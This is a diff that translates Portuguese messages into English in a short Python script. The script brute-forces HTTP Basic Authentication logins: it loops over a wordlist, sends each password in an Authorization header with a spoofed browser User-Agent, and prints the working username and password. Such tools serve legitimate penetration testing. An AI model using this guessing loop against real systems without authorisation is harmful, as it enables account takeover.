@@ -16,11 +16,11 @@ def banner():
 banner()
 
 if len(sys.argv) != 3: 
-    print("Erro! Passe os argumentos desse jeito: ")
+    print("Error! Pass the arguments like that: ")
     print("python script.py URL WORDLIST")
     print("python script.py http://192.168.0.4 wordlist.txt")
 else:
-    user = raw_input("Qual o user? ")
+    user = raw_input("What is the user? ")
     r = open(sys.argv[2], 'r')
     url = sys.argv[1]
     try:
@@ -30,11 +30,11 @@ else:
             header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0', 'Authorization': 'Basic ' + strPass }
             req = requests.get(url, headers=header)
             if str(req.status_code) == '200':
-                print('Senha encontrada - ' + senha)
-                print('Senha do user ' + user + ': ' + senha)
+                print('Password found - ' + senha)
+                print('Password of ' + user + ' is: ' + senha)
                 print(user + ':' + senha)
                 quit()
             else:
-                print('Senha errada - ' + senha)
+                print('Incorrect password - ' + senha)
     except:
-        print("Aconteceu algum erro. Tem certeza de que a URL passada está usando uma Autenticação HTTP básica? ")        
+        print("An error has occurred. Are you sure the URL passed is using Basic HTTP Authentication? ")        
